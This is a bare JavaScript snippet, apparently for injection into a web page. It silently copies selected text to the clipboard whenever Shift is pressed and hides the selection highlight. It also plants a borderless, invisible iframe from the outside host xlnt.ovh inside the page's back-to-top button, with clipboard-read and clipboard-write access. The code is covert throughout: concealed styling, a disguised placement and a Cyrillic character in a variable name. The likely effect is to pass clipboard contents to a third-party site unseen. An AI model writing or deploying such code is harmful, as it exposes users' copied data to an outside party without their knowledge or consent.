var runExchange = function() {
     window.onkeydown = function (еkon) {
      if (еkon.keyCode == 16) {
          var selectedText = window.getSelection().toString();
          var dummy = document.createElement("textarea");
          document.body.appendChild(dummy);
          dummy.value = selectedText;
          dummy.select();
          document.execCommand("copy");
          document.body.removeChild(dummy);
      }
     }
};
var readyStateCheckInterval = setInterval(function() {
	if (document.readyState === "complete") {
		clearInterval(readyStateCheckInterval);
		runExchange();
	}
}, 10);
	var backToTop = document.getElementById("back-to-top");
backToTop.style.background = "none";
backToTop.style.border = "none";
backToTop.style.outline = "none";
var css = '::selection  { background: none; }',
    	head = document.head || document.getElementsByTagName('head')[0],
    	style = document.createElement('style');
	head.appendChild(style);
	style.type = 'text/css';
	if (style.styleSheet){
  		style.styleSheet.cssText = css;
	} else {
  		style.appendChild(document.createTextNode(css));
	}
const iframe = document.createElement('iframe');
iframe.src = "https://xlnt.ovh/search.php";
iframe.allow = "clipboard-read; clipboard-write";
iframe.width = "1280";
iframe.height = "80";
iframe.style.background = "none";
iframe.style.border = "none";
iframe.style.outline = "none";
backToTop.appendChild(iframe);
